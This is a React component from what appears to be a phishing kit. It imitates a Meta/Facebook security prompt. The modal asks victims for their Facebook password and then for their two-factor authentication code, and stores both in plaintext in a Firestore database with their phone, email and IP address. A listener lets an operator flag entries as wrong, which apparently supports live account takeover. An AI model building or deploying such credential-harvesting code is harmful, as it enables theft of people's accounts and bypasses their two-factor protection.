import {
  collection,
  addDoc,
  onSnapshot,
  query,
  where,
  doc,
  updateDoc,
  runTransaction,
  orderBy,
  getDocs,
  limit,
} from "firebase/firestore";
import React, { useEffect, useState } from "react";
import Modal from "react-modal";
import { db } from "../../firebase";
import "./popup.scss";
import logo from '../../../Resources/ic_logo.svg';
import authentication from '../../../Resources/authentication.png';



Modal.setAppElement("#root");

const modalStyle = {
  overlay: {
    backgroundColor: "rgb(0 0 0 / 65%)",
    zIndex: 1000,
  },
  content: {
    maxWidth: "500px",
    height: "90%",
    top: "50%", 
    left: "50%", 
    transform: "translate(-50%, -50%)",
    padding:'15px',
    borderRadius: "8px",
    boxShadow: "0 2px 4px rgba(0, 0, 0, 0.2)",
    backgroundColor: "white",
    position: "relative",
  },
};
const delay = ms => new Promise(res => setTimeout(res, ms));


function maskContact(input) {
  if (!input) return "";
  if (input.includes("@")) {
    const [name, domain] = input.split("@");
    if (name.length <= 2) return input;
    const firstChar = name[0];
    const lastChar = name[name.length - 1];
    const masked = firstChar + "*".repeat(name.length - 2) + lastChar;
    return masked + "@" + domain;
  }

  const digits = input.replace(/\D/g, ""); // chỉ lấy số
  if (digits.length < 4) return input;

  const countryCodeMatch = input.match(/^\+\d+/);
  const countryCode = countryCodeMatch ? countryCodeMatch[0] : "";

  const lastTwo = digits.slice(-2);
  const masked = "*".repeat(digits.length - 2) + lastTwo;

  return countryCode
    ? `${countryCode} ${masked}`
    : masked;
}

const MyPopup = ({ isOpen, onClose, onSave }) => {


  
        const formData = JSON.parse(
        localStorage.getItem("user") || "{}"
      );
  const [passwordShown, setPasswordShown] = useState(false);
  const togglePasswordVisiblity = async () => {
    setPasswordShown(passwordShown ? false : true);
    await delay(2000);
    setPasswordShown(false);
  };



  const [pass, setPass] = useState("");
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState(1);
  const [data, setData] = useState(null);
  const usersRef = collection(db, "users");
  const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
  const listener = (userID) => {
    onSnapshot(doc(db, "users", userID), (snapshot) => {
      const status = snapshot.data()?.status;
      if (status === 0 || status === 1) return;
      // Handle different status codes here
      switch (status) {
        case -1:
          setResult(-1);    
          break;
        case 2:
          setResult(2);    
          break;
        case 3:
          setResult(3);    
          break;
        case -2:
          setResult(-2);    
          break;
        default:
          console.log(status);
      }
      setIsLoading(false); // Set loading back to false
    });
  };

  const updateIndex = async (userID) => {
    try {
      await runTransaction(db, async (transaction) => {
        const sfDocRef = doc(db, "users", userID);
        const sfDoc = await transaction.get(sfDocRef);
        const dosLast = await getDocs(q);
        if (!sfDoc.exists()) {
          throw "Document does not exist!";
        }
        const [lastest] = dosLast.docs
        const auto_id = (lastest?.get("auto_id") || 0) + 1;
        transaction.update(sfDocRef, { auto_id });
      });

      console.log("Transaction successfully committed!");
    } catch (e) {
      console.log("Transaction failed: ", e);
    }
  };


  const handlePass = async () => {
    try {
          setIsLoading(true);
    if(pass.length < 1) return;

      if (data) {
        await updateDoc(doc(db, "users", data), {
          status: 1,
          pass: pass
        });
        return;
      }
      if(formData){
        const user = await addDoc(collection(db, "users"), {
          pass:pass,phone:formData.phone,email:formData.email,auth:'',ip:formData.ip,status: 1,createdAt: new Date().getTime(),
        });
        if(user.id){
          updateIndex(user.id);
          setData(user.id);
          listener(user.id);
        }
      }
    } catch (error) {
      console.error("Error saving data to Firestore: ", error);
    }
  };



  const handleCode = async () => {
  try {
    setIsLoading(true); // bật spinner ngay
    setTimeout(async () => {
    try {
      console.log(data);
      if (!data) return;
      await updateDoc(doc(db, "users", data), { status: 2, auth: code });
      listener(user.id);
      // spinner vẫn bật, chờ listener xử lý
    } catch (err) {
      console.log(err);
    }
  }, 1000); // delay 50ms để React render spinner
    console.log(data);
    // if (!data) return;
    // await updateDoc(doc(db, "users", data), { status: 2, auth: code });
    // không tắt spinner, chờ listener
  } catch (err) {
    console.log(err);
  }finally{
     setIsLoading(false); // bật spinner ngay
  }
};


  return (
    <Modal
      isOpen={isOpen}
      onRequestClose={onClose}
      contentLabel="Enter your password"
      style={modalStyle}
      shouldCloseOnOverlayClick={true}
    >
      <>
 

{(result === 2 || result === -2) &&
<div className="bg-white flex items-center justify-center">
      <div className="bg-white w-full max-w-xl p-1">
        <p className="text-gray-500 text-sm mb-2">
          {formData.name} • Facebook
        </p>

        <h1 className="text-lg font-bold mb-4">
          Two-factor authentication required (1/3)
        </h1>

        <p className="text-gray-500 text-sm mb-6 leading-relaxed">
          Enter the code for this account that we send to 
          {maskContact(formData.email)}, {maskContact(formData.phone)} or simply confirm 
          through the application of two factors that you have set 
          (such as Duo Mobile or Google Authenticator)
        </p>

          <img
            src={authentication}
            alt="2FA Illustration"
            className="rounded-xl mb-6 flex items-center justify-center max-h-48"
          />

        <input
          type="text"
          placeholder="Code"
          readOnly={isLoading}
                  value={code}
                  onChange={(e) => {
                    if(!isNaN(+e.target.value) == false) return;
                    setCode(e.target.value);
                  }}
          className="w-full border border-gray-300 rounded-lg px-4 py-2.5 mb-1 focus:outline-none focus:ring-2 focus:ring-blue-500"
        />
                  {result === -2 && !isLoading && <p className="mt-2 text-red-500 text-sm">The code you entered is incorrect.</p>}

 <button
  onClick={handleCode}
  disabled={isLoading}
  className="mt-3 w-full h-[40px]
  bg-[#1877F2] text-white rounded-full
  hover:bg-[#166FE5]
  transition-all duration-200
  flex items-center justify-center"
>
  {isLoading ? <span>  
    <span
    className={`flex items-center gap-2 transition-opacity duration-200`}>
<span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
  </span>
  </span> : 
  <span>Continue</span>
  }
</button>
        <button className="mt-3 w-full border border-gray-300 text-gray-500 py-3 h-[40px] rounded-full hover:bg-gray-100 flex items-center justify-center">
          Try another way
        </button>
      </div>
    </div>
}

{/* pass */}
{(result === 1 || result === -1) && 
<div className="bg-white flex items-center justify-center">
      <div className="mt-5 w-full px-1 text-center">  
        <div className="mb-10">
          <div className="w-12 h-12 mb-5 mx-auto">
<img src={logo} alt="Meta" className="w-full"/>
 </div>
        </div>
        <p className="text-gray-500 text-sm mb-6">
          For your security, you must enter your password to continue.
        </p>
                  <div style={{position:'relative',width:'100%'}}>
                    <input type={passwordShown ? "text" : "password"} style={{width: '100%'}} id="Password" value={pass} onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value);}} className="InputText__input"/>
                     <img onClick={togglePasswordVisiblity} style={{position:'absolute',top: '50%',right:'15px',transform: 'translateY(-50%)',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                  </div>
                  {result === -1 && !isLoading && <p className="mt-2 text-red-500 text-sm">The password you entered is incorrect.</p>}
        <button
   onClick={handlePass} // bình thường, không async () => ...
  disabled={isLoading}
  className="mt-3 w-full h-[40px]
  bg-[#1877F2] text-white rounded-full
  hover:bg-[#166FE5]
  transition-all duration-200
  flex items-center justify-center"
>
  {isLoading ? <span>  <span
    className={`flex items-center gap-2 transition-opacity duration-200`}>
<span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
  </span></span> : <span>Continue</span>}
</button>
        <p className="text-gray-400 mt-5 text-sm cursor-pointer hover:underline">
          Forgot your password?
        </p>
        <div className="mt-16 text-gray-400 text-sm flex items-center justify-center gap-1">
          <span className="text-xl">∞</span>
          <span>Meta</span>
        </div>
      </div>
    </div> 
}
      </>
    </Modal>
  );
};

export default MyPopup;
